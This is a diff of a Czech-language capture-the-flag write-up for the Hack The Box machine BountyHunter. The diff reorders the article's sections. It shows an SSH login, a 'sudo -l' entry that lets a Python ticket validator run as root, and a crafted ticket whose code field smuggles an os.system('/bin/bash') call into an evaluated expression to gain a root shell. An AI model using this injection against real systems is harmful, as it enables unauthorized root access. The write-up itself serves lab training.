@@ -9,6 +9,7 @@ tags: linux rce ssh sudo php exploit
 ## Úvod a kontext
 
 BountyHunter je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.
+
 ## Počáteční průzkum
 
 ### Vyhledání otevřených portů
@@ -121,6 +122,7 @@ Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabi
 ssh development@10.10.11.100
 ```
 ```
+
 ## cat user.txt
 __CENSORED__
 
@@ -134,30 +136,6 @@ __CENSORED__
 
 ## /tmp/shell.md
 ```
-
-## Eskalace oprávnění
-
-### Získání root flagu
-
-Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
-```text
-Skytrain Inc
-```
-```
-## Ticket to New Haven
-__Ticket Code:__
-**102+ 10 == 112 and __import__('os').system('/bin/bash') == False
-##Issued: 2021/04/06
-#End Ticket
-
-## sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
-/tmp/shell.md
-
-### cat root.txt
-__CENSORED__
-```
-
-## Získání přístupu
 
 ### Získání user flagu
 
@@ -173,6 +151,29 @@ bfc34783c9aa2ee9fc1f3e12010fa8c6
 
 ## sudo -l
     (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+```
+
+## Eskalace oprávnění
+
+### Získání root flagu
+
+Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+```text
+Skytrain Inc
+```
+```
+
+## Ticket to New Haven
+__Ticket Code:__
+**102+ 10 == 112 and __import__('os').system('/bin/bash') == False
+##Issued: 2021/04/06
+#End Ticket
+
+## sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+/tmp/shell.md
+
+### cat root.txt
+__CENSORED__
 ```
 
 ## Shrnutí klíčových poznatků
